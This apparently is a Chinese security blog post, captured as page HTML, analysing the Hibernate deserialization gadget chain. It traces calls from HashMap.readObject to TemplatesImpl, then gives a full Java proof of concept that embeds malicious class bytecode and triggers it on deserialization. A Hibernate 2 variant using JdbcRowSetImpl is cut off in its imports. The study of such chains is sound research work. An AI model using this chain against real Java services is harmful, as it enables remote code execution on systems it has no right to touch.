@@ -1,0 +1,924 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hibernate利用链Hibernate 1给出调用栈 HashMap.readObject()     TypedValue.hashCode()         ValueHolder.getValue()             ValueHolder.DeferredInitializer().initialize()                 ComponentType.getH">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hibernate利用链">
+<meta property="og:url" content="https://zer0peach.github.io/2024/03/08/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="Hibernate利用链Hibernate 1给出调用栈 HashMap.readObject()     TypedValue.hashCode()         ValueHolder.getValue()             ValueHolder.DeferredInitializer().initialize()                 ComponentType.getH">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314171559670.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183122424.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183350585.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183647213.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184008593.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184737326.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185832459.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185900606.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190048959.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190339428.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190400090.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190652314.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314191824703.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193159860.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193246189.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193257977.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193649136.png">
+<meta property="article:published_time" content="2024-03-08T08:44:00.000Z">
+<meta property="article:modified_time" content="2024-03-14T11:46:10.430Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314171559670.png">
+  
+  
+  
+  <title>Hibernate利用链 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hibernate利用链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-08 16:44" pubdate>
+          2024年3月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          91 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hibernate利用链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Hibernate利用链"><a href="#Hibernate利用链" class="headerlink" title="Hibernate利用链"></a>Hibernate利用链</h1><h2 id="Hibernate-1"><a href="#Hibernate-1" class="headerlink" title="Hibernate 1"></a>Hibernate 1</h2><p>给出调用栈</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span>
+    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TypedValue</span>.</span></span>hash<span class="hljs-constructor">Code()</span>
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ValueHolder</span>.</span></span>get<span class="hljs-constructor">Value()</span>
+            ValueHolder.<span class="hljs-constructor">DeferredInitializer()</span>.initialize<span class="hljs-literal">()</span>
+                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ComponentType</span>.</span></span>get<span class="hljs-constructor">HashCode()</span>
+		            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PojoComponentTuplizer</span>.</span></span>get<span class="hljs-constructor">PropertyValue()</span>
+                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractComponentTuplizer</span>.</span></span>get<span class="hljs-constructor">PropertyValue()</span>
+                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BasicPropertyAccessor$BasicGetter</span>.</span></span>get<span class="hljs-literal">()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GetterMethodImpl</span>.</span></span>get<span class="hljs-literal">()</span>
+                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span></code></pre></div>
+
+<p>这里分几个部分，思路清晰一点</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>漏洞点在</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314171559670.png" srcset="/img/loading.gif" lazyload alt="image-20240314171559670"></p>
+<p>能够反射执行方法</p>
+<p>那我们看看这个method如何控制</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183122424.png" srcset="/img/loading.gif" lazyload alt="image-20240314183122424"></p>
+<p>在<code>getGetterOrNull</code>中首先调用getterMethod获取getter方法，然后在最后调用构造方法return一个BasicGetter对象,method在构造方法中被赋值</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183350585.png" srcset="/img/loading.gif" lazyload alt="image-20240314183350585"></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>因此现在的思路就是哪里会调用get方法，经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183647213.png" srcset="/img/loading.gif" lazyload alt="image-20240314183647213"></p>
+<p>这里就继续找谁调用了<code>getPropertyValues</code>，并且这里<code>AbstractComponentTuplizer</code>由于是抽象类，我们先找他的实现类</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184008593.png" srcset="/img/loading.gif" lazyload alt="image-20240314184008593"></p>
+<p>这里选择<code>PojoComponentTuplizer</code>，它会调用父类的<code>getPropertyValues</code></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184737326.png" srcset="/img/loading.gif" lazyload alt="image-20240314184737326"></p>
+<p>继续找谁调用了<code>PojoComponentTuplizer</code>的<code>getPropertyValues</code></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185832459.png" srcset="/img/loading.gif" lazyload alt="image-20240314185832459"></p>
+<p>找到<code>ComponentType</code></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185900606.png" srcset="/img/loading.gif" lazyload alt="image-20240314185900606"></p>
+<p>然后参考的文章说该类的<code>getHashCode</code>会调用<code>getPropertyValue</code></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190048959.png" srcset="/img/loading.gif" lazyload alt="image-20240314190048959"></p>
+<h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>两个参考文章都说到这里，但是我们可以发现上面两张图调用的函数很明显不一样</p>
+<p>一个是</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190339428.png" srcset="/img/loading.gif" lazyload alt="image-20240314190339428"></p>
+<p>一个是</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190400090.png" srcset="/img/loading.gif" lazyload alt="image-20240314190400090"></p>
+<p>我根据poc调试后发现走的是<code>getPropertyValue</code>，并且下一步直接走到了</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190652314.png" srcset="/img/loading.gif" lazyload alt="image-20240314190652314"></p>
+<p>所以我的想法是<code>componentTuplizer</code>设置为<code>PojoComponentTuplizer</code>后，由于没有<code>getPropertyValue</code>方法，于是调用了父类的<code>getPropertyValue</code>，即<code>AbstractComponentTuplizer</code></p>
+<p>感觉这个解释其实也有问题，但是我的能力只能想到这些</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>继续找如何接上<code>getHashCode</code></p>
+<p>找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用getHashcode了的</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314191824703.png" srcset="/img/loading.gif" lazyload alt="image-20240314191824703"></p>
+<p>TypedValue 初始化时，除了赋值 type、value 操作外，还调用了 <code>initTransients</code> 方法对 hashcode 属性进行了初始化</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193159860.png" srcset="/img/loading.gif" lazyload alt="image-20240314193159860"></p>
+<p>初始化时新创建了一个 ValueHolder 对象，并为其赋予了一个新的 DeferredInitializer 对象并重写了 <code>initialize()</code> 方法</p>
+<p>我们首先发现 TypedValue 的 <code>hashCode()</code> 方法调用了成员变量 <code>hashcode.getValue()</code> 方法，这个方法又会调用 DeferredInitializer 的 <code>initialize()</code> 方法，就是之前我们初始化的那个</p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193246189.png" srcset="/img/loading.gif" lazyload alt="image-20240314193246189"></p>
+<p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193257977.png" srcset="/img/loading.gif" lazyload alt="image-20240314193257977"></p>
+<p>这里也有点不理解是如何调用进去的</p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>总而言之调用到hashCode函数即可，那很明显就是HashMap作入口</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>即使知道了大概的调用顺序，想要写出poc也不是容易的事</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">package hibernate;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.hibernate.engine.spi.TypedValue;
+import org.hibernate.<span class="hljs-keyword">type</span>.Type;
+import sun.reflect.ReflectionFactory;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * Hello world!</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> */</span>
+public <span class="hljs-keyword">class</span> Hibernate1 &#123;
+
+    public static String fileName = <span class="hljs-string">&quot;Hibernate1.bin&quot;</span>;
+    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        field.set(obj, value);
+    &#125;
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;
+        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;
+        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;
+        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;
+    &#125;
+    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;
+        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;
+    &#125;
+
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        Class&lt;?&gt; componentTypeClass             = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.type.ComponentType&quot;</span>)</span>;
+        Class&lt;?&gt; pojoComponentTuplizerClass     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>)</span>;
+        Class&lt;?&gt; abstractComponentTuplizerClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>)</span>;
+
+
+        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span>
+        TemplatesImpl tmpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;
+        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);
+        Method  <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getOutputProperties&quot;</span>)</span>;
+
+        Object getter;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>
+            Class&lt;?&gt;getterImpl  = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>)</span>;
+            Constructor&lt;?&gt; constructor = getterImpl.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;
+            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">method</span>)</span>;
+        &#125; catch (Exception ignored) &#123;
+            <span class="hljs-comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>
+            Class&lt;?&gt;       basicGetter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>)</span>;
+            Constructor&lt;?&gt; constructor = basicGetter.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>, Method.<span class="hljs-params">class</span>, String.<span class="hljs-params">class</span>)</span>;
+            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">tmpl</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-keyword">method</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
+        &#125;
+
+        <span class="hljs-comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span>
+        Object tuplizer = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">pojoComponentTuplizerClass</span>)</span>;
+
+        <span class="hljs-comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span>
+        Field field = abstractComponentTuplizerClass.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;getters&quot;</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        Object getters = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">getter</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-number">1</span>);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(getters, <span class="hljs-number">0</span>, getter);
+        field.set(tuplizer, getters);
+
+        <span class="hljs-comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span>
+        Object <span class="hljs-keyword">type</span> = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">componentTypeClass</span>)</span>;
+
+        <span class="hljs-comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span>
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,<span class="hljs-params">tuplizer</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertySpan&quot;</span>,1)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertyTypes&quot;</span>,<span class="hljs-params">new</span> Type[]&#123;(Type)</span> <span class="hljs-keyword">type</span>&#125;);
+
+        <span class="hljs-comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span>
+        TypedValue typedValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TypedValue((Type)</span> <span class="hljs-keyword">type</span>, null);
+
+        <span class="hljs-comment">// 创建反序列化用 HashMap</span>
+        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;
+        hashMap.put(typedValue, <span class="hljs-string">&quot;su18&quot;</span>);
+
+        <span class="hljs-comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span>
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">typedValue</span>,<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-params">tmpl</span>)</span>;
+
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;
+        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">hashMap</span>)</span>;
+        oos.close<span class="hljs-literal">()</span>;
+
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(barr);
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">new</span> ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>));
+        Object o = (Object)ois.read<span class="hljs-constructor">Object()</span>;
+    &#125;
+
+&#125;</code></pre></div>
+
+<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193649136.png" srcset="/img/loading.gif" lazyload alt="image-20240314193649136"></p>
+<h2 id="GetterMethodImpl"><a href="#GetterMethodImpl" class="headerlink" title="GetterMethodImpl"></a>GetterMethodImpl</h2><p>在 Hibernate 5.x 里，实现了 <code>org.hibernate.property.access.spi.GetterMethodImpl</code> 类，这个类能够替代 <code>BasicPropertyAccessor$BasicGetter.get()</code> 来调用 getter 方法。</p>
+<h2 id="Hibernate-2"><a href="#Hibernate-2" class="headerlink" title="Hibernate 2"></a>Hibernate 2</h2><p>。。。。其实就是把<code>Templates</code>改为<code>JdbcRowSetImpl</code></p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.rowset.JdbcRowSetImpl;
+import javassist.ClassPool;
+import org.hibernate.engine.spi.TypedValue;
+import org.hibernate.<span class="hljs-keyword">type</span>.Type;
+import sun.reflect.ReflectionFactory;
+
+import java.io.ByteArrayInputStream;
